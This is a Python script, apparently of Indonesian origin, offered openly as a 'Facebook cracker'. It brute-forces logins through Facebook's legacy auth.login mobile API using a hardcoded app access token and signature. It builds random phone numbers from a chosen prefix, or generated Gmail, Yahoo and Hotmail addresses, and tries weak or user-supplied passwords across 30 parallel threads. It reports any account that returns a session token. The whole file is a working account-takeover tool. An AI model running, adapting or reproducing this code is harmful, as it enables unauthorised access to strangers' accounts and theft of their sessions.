import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [BERHASIL] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [GAGAL] %s -> %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  ❌ FACEBOOK CRACKER RANDOM NUMBERS ❌
           🌹RIZKY MAULANA SIDIK XD🌹
  Isi Nomer Nya Dulu Dong Bro!.
  Harus 5 Digit Ye Bro Jangan Kurang / Lebih Ye.
  Contoh: 62877
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
        ❌SUPPORT : REVOLUTION.ID❌
  Semoga Hari Ini Lo Beruntung Ya Bro:)
  Tunggu Anak Sabar Di Sayang Allah......
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Selesai Bro Silahkan Keluar Atau Gw Pukul Lo ')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  ❌ FACEBOOK CRACKER RANDOM EMAIL ❌
  ❌REVOLUTION X RIZKY MAULANA SIDIK❌
  Isi Nama Pengguna Nya Dulu Bro !
  Contoh: rizkygans, revolutionid
  ''')
  nama=input('  Nama pengguna: ')
  domain=input('''
  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
  pilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon Isi Dulu Yang Bener Bro😑.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Masukan Jumlah Domain Yang Mau Di Buat Contoh : 633
  Jumlah: '''))
  setpw=input('''
  Set Password Yang Mendekati Nama Pengguna Bro😁
  contoh: rizkyganteng,rizkygans
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
         🌹RIZKY MAULANA SIDIK XD🌹
  Semoga Hari Ini Lu Dapet Banyak Ya Bro😍
  Tunggu Bro Anak Sabar Di Sayang Allah.....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah Selesai Bro Sana Balik.')

def pilih():
  print('''
       ❌RIZKY MAULANA SIDIK XD❌
  1. 🌹CRACK DARI NOMER RANDOM🌹
  2. 🌹CRACK DARI EMAIL RANDOM🌹
     ❌REVOLUTION ID X ALIMINATOR❌
  ''')
  pil=int(input('  Pilih mana man?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf Ada Yang Eror Bro, Silahkan Coba Lagi Yahh.')
